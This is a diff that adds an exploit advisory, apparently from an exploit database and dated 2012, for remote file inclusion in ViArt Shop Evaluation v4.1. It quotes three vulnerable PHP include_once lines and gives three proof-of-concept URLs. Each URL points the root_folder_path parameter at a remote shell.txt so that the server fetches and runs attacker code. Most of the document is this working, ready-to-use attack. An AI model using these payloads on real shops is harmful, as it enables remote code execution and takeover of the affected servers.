@@ -1,0 +1,37 @@
+############################################
+### Exploit Title: ViArt Shop Evaluation v4.1 Multiple Remote File Inclusion Vulnerability
+### Date: 26/9/2012 
+### Author: L0n3ly-H34rT 
+### Contact: l0n3ly_h34rt@hotmail.com 
+### My Site: http://se3c.blogspot.com/ 
+### Vendor Link: http://www.viart.com/
+### Software Link: http://www.viart.com/downloads/viart_shop-4.1.zip
+### Version: 4.1
+### Tested on: Linux/Windows 
+############################################
+
+# Affected files :
+
+1- ( /admin/admin_header.php ) on line 13 :
+
+include_once($root_folder_path . "messages/" . $language_code . "/cart_messages.php");
+
+2- ( /includes/ajax_list_tree.php ) on line 29 :
+
+include_once($root_folder_path . "includes/navigator.php");
+
+3- ( /includes/previews_functions.php ) on line 13 :
+
+include_once($root_folder_path . "includes/sql_functions.php");
+
+# P.O.C :
+
+http://127.0.0.1/viart_shop-4.1/admin/admin_header.php?root_folder_path=http://127.0.0.1/shell.txt?
+
+http://127.0.0.1/viart_shop-4.1/includes/ajax_list_tree.php?root_folder_path=http://127.0.0.1/shell.txt?
+
+http://127.0.0.1/viart_shop-4.1/includes/previews_functions.php?root_folder_path=http://127.0.0.1/shell.txt?
+
+############################################
+
+# Greetz to my friendz
